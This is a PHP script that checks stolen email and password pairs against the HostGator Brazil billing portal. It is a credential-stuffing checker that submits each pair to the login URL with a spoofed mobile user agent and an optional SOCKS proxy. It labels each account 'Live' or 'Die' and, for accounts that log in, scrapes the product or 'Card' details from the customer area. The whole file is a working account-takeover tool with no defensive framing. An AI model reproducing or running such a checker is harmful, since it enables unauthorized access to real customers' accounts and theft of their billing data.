<?php
require ('class_curl.php');

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}


if ($_POST['do'] == 'check')
{

    $curl = new curl();
    delete_cookies();
    $curl->ua('Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16');
 

    $result = array();
    $delim = urldecode($_POST['delim']);
    list($email, $pwd) = explode($delim, urldecode($_POST['mailpass']));
//   $sock = urldecode($_POST['IP']);

    if (!$email)
    {
        $result['error'] = -1;
        $result['msg'] = urldecode($_POST['mailpass']);
        echo json_encode($result);
        exit;
    }
    
    delete_cookies();
 //  $curl->sock5($sock);

	if($curl->validate()){
		$fullink='https://financeiro.hostgator.com.br/dologin.php?token=786fe4f6260582c8b2f8f86dde6073eb4c9fe6c1&username='.$email.'&password='.$pwd.'';
		$curl->page($fullink);
		
		if($curl->validate()){
		
		
		//	file_put_contents('2.html', $curl->content);
			 
			 if(stripos($curl->content, 'O e-mail e/ou senha estão incorretos. Por favor, tente novamente.') !== false){
			 	$result['error'] = 2;
				$result['msg'] = '<b style="color:red;">Die</b> => '. $email .' | ' .$pwd.'| Checked On Akatsuki-ID'; 

			 }
			 //var message={
			 elseif(substr_count($curl->content, 'https://financeiro.hostgator.com.br/clientarea.php') !== false){
				 $curl->page('https://financeiro.hostgator.com.br/clientarea.php?action=products');
                 $cc = getStr($curl->content,'class="clientareatableactive">','</tr>');
                $cc1 = str_replace(' ','',$cc);
                $cc2 = str_replace('\n','',$cc1);
                $cc3 = str_replace('\r\n','',$cc2);
			 
				$result['error'] = 0;
                $result['msg'] = '<b style="color:yellow;">Live</b> => ' . $email . ' | ' . $pwd.' | Card: <b style="color:red;">'.$cc1.'</b> | Checked On Akatsuki-ID'; 


			 }
			
			 else{
			 
					 
			 	$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Cant Check</b> => ' . $email . ' | ' . $pwd.' | Checked On Akatsuki-ID'; 
			 }
			
							
		}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
		}	
		
	
	
	}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
	}
	
	

    echo json_encode($result);
    exit;

}

?>